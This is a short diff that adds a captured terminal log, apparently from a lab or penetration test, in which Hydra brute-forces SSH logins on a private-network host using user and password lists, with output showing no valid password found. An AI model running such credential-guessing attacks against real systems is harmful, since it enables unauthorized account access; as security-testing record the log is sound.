@@ -1,0 +1,10 @@
+$ hydra -t 2 -w 5 -L users.txt -P pass.txt 192.168.91.32 ssh
+Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-11-04 10:45:49
+[DATA] max 2 tasks per 1 server, overall 2 tasks, 5 login tries (l:1/p:5), ~3 tries per task
+[DATA] attacking ssh://192.168.91.32:22/
+1 of 1 target completed, 0 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-11-04 10:46:02
+
+Process exit: 0
